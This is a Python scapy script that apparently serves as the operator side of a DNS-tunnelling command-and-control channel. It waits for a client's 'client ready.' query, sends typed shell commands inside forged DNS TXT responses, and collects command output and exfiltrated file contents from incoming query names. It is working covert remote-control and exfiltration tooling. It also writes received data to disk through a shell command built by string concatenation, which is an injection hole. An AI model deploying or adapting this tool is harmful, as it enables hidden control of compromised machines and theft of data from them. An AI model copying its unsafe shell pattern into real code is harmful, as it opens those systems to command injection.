#!/usr/bin/env python3
import subprocess
import os
from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP, RandShort


def handle_packet(packet):
    #packet.show()
    if packet[DNS].qd.qname.decode() == "client ready." and packet[DNS].qr == 0:
        print("Client ready!!\n")
        command = input("[Server] Enter command to execute on client:\n")
        print("command = ", command)
        #send_packet(packet, command)
        send_packet(packet, command)
        #print(".......................................................")
    else:
       # packet.show()
        data = packet[DNS].qd.qname.decode()
        if data.startswith("data"):
            print("file sent")
            TransferFile(data[5:])
        else:
            if data.endswith("."):
                data = data[:-1]
            print(data, end="")
        #print(".......................................................")

def send_packet(packet, command):
    response = IP(dst=packet[IP].src) / \
                    UDP(dport=packet[UDP].sport, sport=53) / \
                    DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNSQR], \
                        an=DNSRR(type = 'TXT', rdata = command))
    response.show()
    send(response)

def TransferFile(messasge):
	subprocess.check_output('echo "' + messasge + '" > file_sent.txt' , shell=True)
 
def main():
    sniff(filter="udp port 53", prn=handle_packet)
    
if __name__ == '__main__':
    main()